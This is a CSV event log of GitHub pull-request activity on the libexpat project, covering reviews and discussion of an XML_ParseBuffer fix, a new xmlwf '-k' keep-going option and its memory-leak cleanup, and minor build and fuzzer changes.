case:concept:name,concept:name,time:timestamp,people,scene,message,description
438,OpenPR,2021-02-23 22:44:35,hartwork,unfork_merge,,
438,Revise,2021-02-24 01:26:06,hartwork,unfork_merge,"xmlparse.c: Reject missing call to XML_GetBuffer in XML_ParseBuffer

.. rather than running into undefined behavior.","{""sha"": ""811c41e3be624c47927883c7523f90c73e1becb7"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-02-24T01:12:49Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-02-24T01:26:06Z""}}"
438,Revise,2021-02-24 02:34:43,hartwork,unfork_merge,apply-clang-format.sh: Report on clang-format version,"{""sha"": ""af86899bf96bc713a0a49093c66e277dbcef6253"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-02-23T22:10:15Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-02-24T02:34:43Z""}}"
438,Revise,2021-02-24 02:34:43,hartwork,unfork_merge,.travis.yml: Upgrade to Ubuntu Bionic 18.04.x LTS and Clang 11,"{""sha"": ""44d889e78cb0daf0f3b35ee31364b37130d89523"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-02-23T21:04:20Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-02-24T02:34:43Z""}}"
438,Revise,2021-02-24 02:34:43,hartwork,unfork_merge,.travis.yml: Install llvm-11 for llvm-symbolizer,"{""sha"": ""64410342fd8dcc610ed66ccaa7166d801b8c374e"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-02-23T23:28:17Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-02-24T02:34:43Z""}}"
438,RenameTitle,2021-02-24 02:44:26,hartwork,unfork_merge,,"{""rename"": {""from"": ""Travis CI: Upgrade to Ubuntu Bionic 18.04.x LTS and Clang 11"", ""to"": ""xmlparse.c: Reject missing call to XML_GetBuffer in XML_ParseBuffer""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4368471464""}"
438,Labeled,2021-02-24 02:44:56,hartwork,unfork_merge,bug,
438,ReviewApproved,2021-02-26 12:00:56,RMJ10,unfork_merge,"I wouldn't have snuck the test in there myself, but it's a perfectly viable place for it.  The fix itself is very nice, and won't impact efficiency.  Nice catch!","{""author_association"": ""CONTRIBUTOR"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/438#pullrequestreview-599510575""}"
438,IssueComment,2021-02-26 14:59:48,hartwork,unfork_merge,@RMJ10 thank you for the review! :pray: ,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/786698918"", ""author_association"": ""MEMBER""}"
438,MergePR,2021-02-26 15:00:20,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4382287908"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/86e0984f2b73509bb48608f4c4f65cfc12facff0""}"
438,CrossReferenced,2021-02-26 20:17:54,hartwork,unfork_merge,.travis.yml: Enable UBSan with Clang as well,"{""reference"": {""url"": ""https://api.github.com/repos/uriparser/uriparser/issues/96"", ""is_pull_request"": true}}"
438,DeleteBranch,2021-02-26 20:36:33,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4383657144"", ""commit_url"": null}"
439,OpenPR,2021-03-01 01:21:02,timbray,fork_merge,,
439,ReviewRejected,2021-03-01 02:51:15,hartwork,fork_merge,"Hi Tim,


I'm on board with the general idea but please adjust some details:

- Variable name `keepgoingafterbadfile` is not easy to read and breaks style with its direct neighbour variables.  Please use camel case, e.g. `continueOnError`, for consistency.
- From a quick look, it seems like `-k` would make xmlwf return 0 on errors now — true? Please make sure that while xmlwf continues, that the eventual exit code is not 0 but still 2 on errors.  
- We have a note…
  ```
  /* Generated with:
   * $ xmlwf/xmlwf_helpgen.sh
   */
  ```
  …in `xmlwf.c` that is apparently not easy enough to see.  Please add `-k` to `xmlwf/xmlwf_helpgen.py`, and then run `xmlwf/xmlwf_helpgen.sh` to obtain the output to put into the usage section in `xmlwf.c`. That way, `xmlwf/xmlwf_helpgen.py` will be in sync both before and _after_ this pull request.
- You add a blank line after line 1004. I don't see why.  Please either revert that change, or — if it matters to you — move that change in whitespace [to a dedicated commit](https://blog.hartwork.org/posts/my-approach-to-code-review/) please.
- It would be great to mention in the help output and man page that continuing will only affect non-fatal errors rather than all errors.

Thank you!

Best


Sebastian","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/439#pullrequestreview-600356970""}"
439,RenameTitle,2021-03-01 02:53:56,hartwork,fork_merge,,"{""rename"": {""from"": ""Add -k option"", ""to"": ""xmlwf: Add argument -k to allow continuing after non-fatal errors""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4387029323""}"
439,Assigned,2021-03-01 02:54:13,hartwork,fork_merge,,"{""assignee"": {""login"": ""hartwork"", ""id"": 1577132, ""node_id"": ""MDQ6VXNlcjE1NzcxMzI="", ""avatar_url"": ""https://avatars.githubusercontent.com/u/1577132?v=4"", ""gravatar_id"": """", ""url"": ""https://api.github.com/users/hartwork"", ""html_url"": ""https://github.com/hartwork"", ""followers_url"": ""https://api.github.com/users/hartwork/followers"", ""following_url"": ""https://api.github.com/users/hartwork/following{/other_user}"", ""gists_url"": ""https://api.github.com/users/hartwork/gists{/gist_id}"", ""starred_url"": ""https://api.github.com/users/hartwork/starred{/owner}{/repo}"", ""subscriptions_url"": ""https://api.github.com/users/hartwork/subscriptions"", ""organizations_url"": ""https://api.github.com/users/hartwork/orgs"", ""repos_url"": ""https://api.github.com/users/hartwork/repos"", ""events_url"": ""https://api.github.com/users/hartwork/events{/privacy}"", ""received_events_url"": ""https://api.github.com/users/hartwork/received_events"", ""type"": ""User"", ""site_admin"": false}}"
439,Labeled,2021-03-01 02:54:18,hartwork,fork_merge,enhancement,
439,IssueComment,2021-03-01 03:10:43,timbray,fork_merge,"OK.  BTW, is there a letter you like better than -k?","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/787605006"", ""author_association"": ""CONTRIBUTOR""}"
439,IssueComment,2021-03-01 04:05:28,timbray,fork_merge,"I think I got most of what you suggested, probably room for fine-tuning. One question though: You recommended mentioning that  ""that continuing will only affect non-fatal errors rather than all errors"".  I'm not sure I understand - an input file being non-well-formed is fatal or nonfatal in this context?","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/787620605"", ""author_association"": ""CONTRIBUTOR""}"
439,ReviewRejected,2021-03-01 16:27:00,hartwork,fork_merge,"> I think I got most of what you suggested, probably room for fine-tuning.

Thank you! :pray: 

> One question though: You recommended mentioning that ""that continuing will only affect non-fatal errors rather than all errors"". I'm not sure I understand - an input file being non-well-formed is fatal or nonfatal in this context?

Good point, maybe we should agree on a definition of non-fatal first.

I see four different way of existing xmlwf, each of them with their dedicated exit code:
1. ""Could not instantiate parser"" at https://github.com/libexpat/libexpat/blob/master/expat/xmlwf/xmlwf.c#L1019 
2. ""Could not allocate memory"" at https://github.com/libexpat/libexpat/blob/86e0984f2b73509bb48608f4c4f65cfc12facff0/expat/xmlwf/xmlwf.c#L1055 
3. Failure to open for writing at https://github.com/libexpat/libexpat/blob/86e0984f2b73509bb48608f4c4f65cfc12facff0/expat/xmlwf/xmlwf.c#L1063
4. Failure to be well-formed at https://github.com/libexpat/libexpat/blob/86e0984f2b73509bb48608f4c4f65cfc12facff0/expat/xmlwf/xmlwf.c#L1125

I think none of these are ""hard fatal"" by nature so we can decide where to draw that line. We could distinguish here between things that may work just fine *for the next file* versus things that are highly unlikely to work *ever again* during the same process runtime. One could argue that error ""Could not instantiate parser"" and error ""Could not allocate memory"" are not likely to go away quickly and seen as indicating some non-ideal system state, and that maybe xmlwf better backs off and stops then. Now that would leave the other two: (3) failure to open for writing and (4) failure to be well-formed. The current implementation in this pull request only continues for case (4) so we would need to either:
- a) Continue for both of (3) and (4) and hence adjust the implementation in that regard _or_
- b) Make all documentation say that `-k` only keeps going for well-formedness issues but still stops on any other error.

Which of these two options do you consider more in the interest of your case and the user base at large?

PS: For context of this feature: users of Linux/Unix already have a powerful keep-going-despite-errors via loops in POSIX shell. Is `-k` targeting Windows users without a proper shell like Bash or is it about efficiency — about not forking new processes all the time?
","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/439#pullrequestreview-600885317""}"
439,IssueComment,2021-03-01 16:35:59,hartwork,fork_merge,"> OK. BTW, is there a letter you like better than -k?

I think `-k` for ""keep going"" already is quite a good choice.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/788089855"", ""author_association"": ""MEMBER""}"
439,IssueComment,2021-03-01 18:49:35,timbray,fork_merge,"In terms of your taxonomy of errors, my feeling is that the ill-formed content is genuinely different from the others, which are all concerned with execution environment in one way or another.  So my first choice would be to have -k be strictly for keep-going-after-non-well-formed.  But, I don't know if my usage of xmlwf is typical - basically, the only xmlwf output I care about is error messages.  I assume that you have a much better understanding of the usage patterns and if you'd like other semantics, I'll probably agree.

As for the other points, don't see anything to disagree with, will refresh PR in a bit.

I wish I could generate the man page but am having trouble getting a working copy of docbook-to-man on my Mac. ","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/788183443"", ""author_association"": ""CONTRIBUTOR""}"
439,IssueComment,2021-03-01 19:22:30,hartwork,fork_merge,"> In terms of your taxonomy of errors, my feeling is that the ill-formed content is genuinely different from the others, which are all concerned with execution environment in one way or another. So my first choice would be to have -k be strictly for keep-going-after-non-well-formed. But, I don't know if my usage of xmlwf is typical - basically, the only xmlwf output I care about is error messages. I assume that you have a much better understanding of the usage patterns and if you'd like other semantics, I'll probably agree.

The more I think about it, there more I wonder how users would feel if `-k` is advertised as ""keep going"" when failure to write to file then still makes it abort. To my understanding, making it continue for those cases as well would not hurt your own use case, right? :thinking: 

> As for the other points, don't see anything to disagree with, will refresh PR in a bit.

Cool! :+1: 

> I wish I could generate the man page but am having trouble getting a working copy of docbook-to-man on my Mac.

There are multiple tools that go by (roughly) that name and Expat [supports multiple, except the SGML based one](https://github.com/libexpat/libexpat/blob/86e0984f2b73509bb48608f4c4f65cfc12facff0/expat/configure.ac#L293-L305), mostly. If none of these work in homebrew and you want help, please drop me a mail — I'm optimistic that Expat's man page can be compiled with something brew-y on macOS.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/788204901"", ""author_association"": ""MEMBER""}"
439,IssueComment,2021-03-01 19:25:01,timbray,fork_merge,"Hmm, in main(), I see calls to usage(argv[0], 2), using error code 2 to signal an argument that should take a value but doesn't (because i==argc).  Also for an unrecognized argument. So the meaning of exit code 2 is overloaded.  Do you want to change exit code usage, or should the readout in xmlwf_helpgen.py explain that exit code 2 can mean either of these things?  I suppose it's too late to change exit code usage now, so I guess just explain it.  Will do that for now.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/788206632"", ""author_association"": ""CONTRIBUTOR""}"
439,IssueComment,2021-03-01 19:31:27,hartwork,fork_merge,"> Hmm, in main(), I see calls to usage(argv[0], 2), using error code 2 to signal an argument that should take a value but doesn't (because i==argc). Also for an unrecognized argument. So the meaning of exit code 2 is overloaded. Do you want to change exit code usage, or should the readout in xmlwf_helpgen.py explain that exit code 2 can mean either of these things? I suppose it's too late to change exit code usage now, so I guess just explain it. Will do that for now.

Interesting catch. I think the `usage(argv[0], 2)` cases are _not_ where keeping 2 constant is very important because in that case the user didn't manage to even invoke the program properly and so then their automation (if any) has other problems, I would suppose? So if we changed those three `usage(argv[0], 2)` to `usage(argv[0], 4)` and document exit status 4 that would be good and helpful in my book, as long as it goes into a dedicated commit :wink: ","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/788211141"", ""author_association"": ""MEMBER""}"
439,IssueComment,2021-03-01 19:31:52,timbray,fork_merge,"> The more I think about it, there more I wonder how users would feel if `-k` is advertised as ""keep going"" when failure to write to file then still makes it abort. To my understanding, making it continue for those cases as well would not hurt your own use case, right? ????

Right.  Unless you change your mind, I'll have -k make it proceed after output-open failure. 
","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/788211442"", ""author_association"": ""CONTRIBUTOR""}"
439,IssueComment,2021-03-01 19:54:32,timbray,fork_merge,"> > The more I think about it, there more I wonder how users would feel if `-k` is advertised as ""keep going"" when failure to write to file then still makes it abort. To my understanding, making it continue for those cases as well would not hurt your own use case, right? ????
> 
> Right. Unless you change your mind, I'll have -k make it proceed after output-open failure.

Um, a bit complicated.  Since I've never used xmlwf output before I had never put any command-line arguments and never saw any output, looks like the code says that if there's no -d or -m or -c, then -t is implied? I.e. no output.  Probably the man page & usage should say that. If you agree, I'll add.

Anyhow… I guess the right way to do the above is to set outputMode = 't' temporarily for this file and restore it after, in the hope that a later output file can be opened?  Or alternatively just assume that outputDir is broken and just put it into 't' mode for the rest of the run?","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/788226316"", ""author_association"": ""CONTRIBUTOR""}"
439,IssueComment,2021-03-01 20:12:04,timbray,fork_merge,"> Anyhow… I guess the right way to do the above is to set outputMode = 't' temporarily for this file and restore it after, in the hope that a later output file can be opened? Or alternatively just assume that outputDir is broken and just put it into 't' mode for the rest of the run?

Actually, if the open fails then userData.fp == NULL, so I guess can just proceed and the parser won't try to write into it… sharing the thinking to give others a chance to shout ""NO THAT's CRAZY"".

","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/788238061"", ""author_association"": ""CONTRIBUTOR""}"
439,IssueComment,2021-03-01 23:14:15,timbray,fork_merge,"> Actually, if the open fails then userData.fp == NULL, so I guess can just proceed and the parser won't try to write into it… sharing the thinking to give others a chance to shout ""NO THAT's CRAZY"".

In fact that was crazy.  Had to insert a big else clause after the `      if (! userData.fp) {` at line 1062 of xmlwf.c. I tested with a few dozen files and everything seems to work fine but it's a bigger change than I'd hoped for... maybe it could be simplified?


","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/788382537"", ""author_association"": ""CONTRIBUTOR""}"
439,ReviewRejected,2021-03-02 22:56:09,hartwork,fork_merge,,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/439#pullrequestreview-602290565""}"
439,IssueComment,2021-03-03 16:57:14,timbray,fork_merge,"OK, makes sense.  And the break/continue construct is simpler. Will revise.

Heh, for C I've been using Emacs.  I'm sure there's a way to tell C-mode not to tabify. ","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/789876492"", ""author_association"": ""CONTRIBUTOR""}"
439,IssueComment,2021-03-04 00:39:32,timbray,fork_merge,"nice little diff, and tab-free :)","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/790191212"", ""author_association"": ""CONTRIBUTOR""}"
439,ReviewRejected,2021-03-04 16:11:41,hartwork,fork_merge,"> nice little diff, and tab-free :)

Well done, thanks! :+1: :pray: 

I'd be very happy now… _if_ the CI wasn't red.  There is two key things:
- clang-format is not happy yet — easy fix
  https://travis-ci.org/github/libexpat/libexpat/jobs/761366461#L1414-L1416
- Clang's LeakSanitizer found a newly introduced memory leak, e.g.
  https://travis-ci.org/github/libexpat/libexpat/jobs/761366460#L1835-L1854

If you need help with the latter, please let me know.

PS: For the soon merge, please let me know if you want to squash the 4 commits together or if I should do a squash merge myself later.  Alternatively, you can re-split the commits into well-isolated semantic units (rather than reflecting editing/review history) for better value in future Git history.  If you're a frequent user of `git rebase -i` and `git add -p` it only takes a few minutes — if not, this is the perfect opportunity to get to [meet the best of Git](https://git-scm.com/book/en/v2/Git-Tools-Rewriting-History).  I did a stress-free version of that with a timer running locally just now and I came to these four commits in 8 minutes total, eventually:

```
# git --no-pager log --oneline master..timbray-master 
db948925 (HEAD -> timbray-master) xmlwf.c: Add note about extending xmlwf/xmlwf_helpgen.py, first
42fb020c xmlwf.xml: Extend man page on exit status 0
499dbf74 xmlwf.c: Add section on exit status to usage output
8b7de304 xmlwf.c: Add -k option to, when processing multiple files, [k]eep processing after encountering files with errors
```

Just to illustrate my point; please feel free to pick different messages!
","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/439#pullrequestreview-604279047""}"
439,IssueComment,2021-03-04 20:08:06,hartwork,fork_merge,PS: Your Git seems configured for user `timothybray@Timothys-MacBook-Pro.local` which is not associated to your GitHub account and hence your commits cannot yet be properly attributed to your GitHub account. Is that intended?,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/790903834"", ""author_association"": ""MEMBER""}"
439,IssueComment,2021-03-04 20:23:53,timbray,fork_merge,"Drat, thought I'd fixed that.

On Thu, Mar 4, 2021 at 12:08 PM Sebastian Pipping <notifications@github.com>
wrote:

> PS: Your Git seems configured for user
> timothybray@Timothys-MacBook-Pro.local which is not associated to your
> GitHub account and hence your commits cannot yet be properly attributed to
> your GitHub account. Is that intended?
>
> —
> You are receiving this because you authored the thread.
> Reply to this email directly, view it on GitHub
> <https://github.com/libexpat/libexpat/pull/439#issuecomment-790903834>,
> or unsubscribe
> <https://github.com/notifications/unsubscribe-auth/AAAEJE6P5VYWPU5EUUZJMGLTB7SDLANCNFSM4YLVJ53Q>
> .
>
","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/790914982"", ""author_association"": ""CONTRIBUTOR""}"
439,IssueComment,2021-03-04 20:26:46,timbray,fork_merge,"That's weird, must investigate:

libexpat/expat> git config --get user.name

Tim Bray

libexpat/expat> git config --get user.email

tbray@textuality.com


On Thu, Mar 4, 2021 at 12:23 PM Tim Bray <tbray@textuality.com> wrote:

> Drat, thought I'd fixed that.
>
> On Thu, Mar 4, 2021 at 12:08 PM Sebastian Pipping <
> notifications@github.com> wrote:
>
>> PS: Your Git seems configured for user
>> timothybray@Timothys-MacBook-Pro.local which is not associated to your
>> GitHub account and hence your commits cannot yet be properly attributed to
>> your GitHub account. Is that intended?
>>
>> —
>> You are receiving this because you authored the thread.
>> Reply to this email directly, view it on GitHub
>> <https://github.com/libexpat/libexpat/pull/439#issuecomment-790903834>,
>> or unsubscribe
>> <https://github.com/notifications/unsubscribe-auth/AAAEJE6P5VYWPU5EUUZJMGLTB7SDLANCNFSM4YLVJ53Q>
>> .
>>
>
","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/790917141"", ""author_association"": ""CONTRIBUTOR""}"
439,IssueComment,2021-03-07 16:34:37,hartwork,fork_merge,"Hi @timbray ,

any news?  Going forward I think we have three open topics:
- Fixing the memory leak
- (Fixing the commit author)
- (Improve on cut lines between individual commits some way; you or me, no worries)

I had a first closer look at the memory leak just now.
What I found is that it's legit and that for case `xmlwf -N -d DIRECTORY [..]` there is memory allocation that we are not freeing up.  Here is where those allocations originate from and are stored to:

```
malloc
    xcsdup
        startDoctypeDecl
            data->currentDoctypeName
        notationDecl
            data->notationListHead = entry
                entry->notationName
                entry->systemId
                entry->publicId
```

With `-k` delaying the call to `exit`, this is more than just a theoretical problem and we'll need to check and leak-free-ify cases `-c -d DIRECTORY` and `-m -d DIRECTORY`.

*If* that's more than what you intended to sign up for, I would understand. In that case, I can offer to extract three commits from everything in here *but* the addition of `-k` as a new pull request for you, and let you review it, and we say goodby to `-k` for the moment; that's the low-cost way forward.

If you *are* committed to adding `-k` *with* taking care of all resulting memory leaks, that's cool.  In that case, let's discuss how to best go forward with this upcoming most complex part.

What do you think?

Best, Sebastian","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/792306965"", ""author_association"": ""MEMBER""}"
439,IssueComment,2021-03-09 21:57:23,timbray,fork_merge,"I'll have a look at the memory leak.  Not surprising I guess, possibly it allocates a few things before trying to open the output and then when the open fails, doesn't clean them up.  ","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/794511055"", ""author_association"": ""CONTRIBUTOR""}"
439,IssueComment,2021-03-12 00:43:47,timbray,fork_merge,"The travis output was very precise, showed pretty well exactly where the memory leak was, fixing was not rocket science.

I think the GitHub committer info is fixed up, which I click on my name it takes me to my GitHub page?

Assuming this works and nothing else turns up, I'd be happy with you just mashing the commits together. They are basically all driven by enabling -k, in my mind.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/797153115"", ""author_association"": ""CONTRIBUTOR""}"
439,ReviewRejected,2021-03-12 15:32:11,hartwork,fork_merge,"> The travis output was very precise, showed pretty well exactly where the memory leak was, fixing was not rocket science.

Unfortunately Travis still shows [multiple unfixed issues on the latest run](https://travis-ci.org/github/libexpat/libexpat/builds/762536321) that I can reproduce locally with commit 1704a1c069b67c173cba946ed6802daeb4ff864d as well, just the ""Travis failed"" markers did not make their way throw to this pull request as the GitHub integration of Travis CI happens to be flaky.


> I think the GitHub committer info is fixed up, which I click on my name it takes me to my GitHub page?

For the latest commit of yours, yes.
","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/439#pullrequestreview-610894200""}"
439,ReviewRejected,2021-03-16 23:47:21,hartwork,fork_merge,"> Assuming this works and nothing else turns up, I'd be happy with you just mashing the commits together.

I found one more small thing, probably the last thing before merge: Please see my comment about `cleanupUserData` below.

---

Regarding the upcoming squash merge: due to your use of broken author info in the first ever commit in here, it seems likely to me that a squash merge will take up that broken author info from the first commit rather than the fixed one from the most recent. I would like to suggest this fix:

Given that (1) you have GNU sed with support for `-i` for in-place operation in `$PATH` and (2) your `user.email` setup is as desired on that local Git clone by now, the following hack squashes all your commits in this pull request together locally and then fixes the author of the remaining single commit:
```console
# git branch ""BACKUP-$(date -I)""  # better safe than sorry
# EDITOR='sed -i ""2,$ s|^pick |fixup |""' git rebase -i 86e0984f2b73509bb48608f4c4f65cfc12facff0  # needs GNU sed
# EDITOR=true git commit --amend --reset-author
```
It's a hack because of the abuse of `${EDITOR}`. There are other ways (e.g. based on `git merge --squash [..]`), that's just one fun hack way to do it. It worked well with Git 2.30.2 over here, I just tried. What do you think?","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/439#pullrequestreview-613807225""}"
439,IssueComment,2021-03-17 03:31:32,timbray,fork_merge,"Very clever.  I’ll try that.

On Tue, Mar 16, 2021 at 7:23 PM Sebastian Pipping ***@***.***>
wrote:

> ***@***.**** commented on this pull request.
> ------------------------------
>
> In expat/xmlwf/xmlwf.c
> <https://github.com/libexpat/libexpat/pull/439#discussion_r595666326>:
>
> > @@ -322,6 +322,12 @@ freeNotations(XmlwfUserData *data) {
>    data->notationListHead = NULL;
>  }
>
> +static void
> +cleanupUserData(XmlwfUserData *userData) {
> +  free((void *)userData->currentDoctypeName);
>
> I see. On that basis you could also: make a copy of these files, ""rewind""
> the pull request using git reset --hard
> 86e0984f2b73509bb48608f4c4f65cfc12facff0 to its beginning, then copy the
> files back in, and make a new commit. Same branch, same pull request, same
> clone. What do you think?
>
> —
> You are receiving this because you were mentioned.
> Reply to this email directly, view it on GitHub
> <https://github.com/libexpat/libexpat/pull/439#discussion_r595666326>, or
> unsubscribe
> <https://github.com/notifications/unsubscribe-auth/AAAEJEYZWMLEX7WSNAW4NCDTEAHANANCNFSM4YLVJ53Q>
> .
>
","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/800766608"", ""author_association"": ""CONTRIBUTOR""}"
439,ReviewApproved,2021-03-17 19:26:40,hartwork,fork_merge,"Looks great now, thanks for your commitment and your patience with this :+1: :pray: 
","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/439#pullrequestreview-614706029""}"
439,MergePR,2021-03-17 20:47:29,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4472508520"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/56c18c63ed9272256f6fc69e8cfa6bd376122fed""}"
439,CrossReferenced,2022-01-20 04:10:36,hartwork,fork_merge,[>=2.3.0] xmlwf: Fix a memory leak on output file opening error (fixes #544),"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/545"", ""is_pull_request"": true}}"
440,SubmitCommit,2021-03-02 22:38:27,hartwork,unfork_close,apply-clang-format.sh: Waterproof rejection of leading tabs,"{""sha"": ""84bea7309ff50e5913bc152568d0fdb3ae25a9d1"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-02T22:14:08Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-02T22:38:27Z""}}"
440,OpenPR,2021-03-02 22:39:14,hartwork,unfork_close,,
440,Labeled,2021-03-02 22:39:15,hartwork,unfork_close,enhancement,
440,CrossReferenced,2021-03-02 22:56:09,hartwork,unfork_close,xmlwf: Add argument -k to allow continuing after non-fatal errors,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/439"", ""is_pull_request"": true}}"
440,UnLabeled,2021-03-02 22:59:34,hartwork,unfork_close,enhancement,
440,IssueCommentSupplement,2021-03-02 22:59:39,hartwork,unfork_close,"It seems like I looked at the wrong CI output: clang-format does reject leading tabs at https://travis-ci.org/github/libexpat/libexpat/jobs/761034643 . Awesome! So this pull request is no longer needed, closing.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/789284947"", ""author_association"": ""MEMBER""}"
440,ClosePR,2021-03-02 22:59:39,hartwork,unfork_close,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4398531440"", ""commit_url"": null}"
440,DeleteBranch,2021-03-02 23:02:40,hartwork,unfork_close,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4398541858"", ""commit_url"": null}"
441,Labeled,2021-03-10 15:10:58,hartwork,unfork_merge,enhancement,
441,Labeled,2021-03-10 15:10:58,hartwork,unfork_merge,compilation,
441,OpenPR,2021-03-10 15:10:58,hartwork,unfork_merge,,
441,RenameTitle,2021-03-10 15:20:51,hartwork,unfork_merge,,"{""rename"": {""from"": ""fuzzers: Addess Clang warning -Wunused-parameter"", ""to"": ""fuzzers: Address Clang warning -Wunused-parameter""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4437142957""}"
441,Revise,2021-03-10 15:21:00,hartwork,unfork_merge,fuzzers: Address Clang warning -Wunused-parameter,"{""sha"": ""0e567d2ed1c5667962652e78e13e1eaf9ba1ecb5"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-10T15:03:29Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2021-03-10T15:21:00Z""}}"
441,MergePR,2021-03-11 01:55:54,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4440639618"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/bfc2f6dcb95eb7893dbca7f72d22bc371f951dc0""}"
441,DeleteBranch,2021-03-16 17:12:16,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/4465876023"", ""commit_url"": null}"
442,OpenPR,2021-03-16 00:40:23,arichardson,fork_merge,,
442,ReviewComment,2021-03-16 01:22:54,hartwork,fork_merge,"Hi @arichardson thanks for bringing this up!
We have one more place that this may affect: https://github.com/libexpat/libexpat/blob/bfc2f6dcb95eb7893dbca7f72d22bc371f951dc0/expat/CMakeLists.txt#L248-L252
What do you think?","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/442#pullrequestreview-612779309""}"
442,IssueComment,2021-03-16 01:38:30,arichardson,fork_merge,"> Hi @arichardson thanks for bringing this up!
> We have one more place that this may affect:
> 
> https://github.com/libexpat/libexpat/blob/bfc2f6dcb95eb7893dbca7f72d22bc371f951dc0/expat/CMakeLists.txt#L248-L252
> 
> 
> What do you think?

I am not sure if those also need to be moved, I'd have to try and understand when CMake populates those variables first. My guess would be that it's safest to move them after `enable_language(CXX)`.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/799877460"", ""author_association"": ""CONTRIBUTOR""}"
442,IssueComment,2021-03-16 10:07:13,arichardson,fork_merge,I've changed the patch to move enable_language(CXX) just after the all the `option()` call. This approach should hopefully avoid any future issues.,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/800124968"", ""author_association"": ""CONTRIBUTOR""}"
442,ReviewRequested,2021-03-16 10:07:23,arichardson,fork_merge,,"{""requested_reviewer"": {""login"": ""hartwork"", ""id"": 1577132, ""node_id"": ""MDQ6VXNlcjE1NzcxMzI="", ""avatar_url"": ""https://avatars.githubusercontent.com/u/1577132?v=4"", ""gravatar_id"": """", ""url"": ""https://api.github.com/users/hartwork"", ""html_url"": ""https://github.com/hartwork"", ""followers_url"": ""https://api.github.com/users/hartwork/followers"", ""following_url"": ""https://api.github.com/users/hartwork/following{/other_user}"", ""gists_url"": ""https://api.github.com/users/hartwork/gists{/gist_id}"", ""starred_url"": ""https://api.github.com/users/hartwork/starred{/owner}{/repo}"", ""subscriptions_url"": ""https://api.github.com/users/hartwork/subscriptions"", ""organizations_url"": ""https://api.github.com/users/hartwork/orgs"", ""repos_url"": ""https://api.github.com/users/hartwork/repos"", ""events_url"": ""https://api.github.com/users/hartwork/events{/privacy}"", ""received_events_url"": ""https://api.github.com/users/hartwork/received_events"", ""type"": ""User"", ""site_admin"": false}, ""requested_team"": null}"
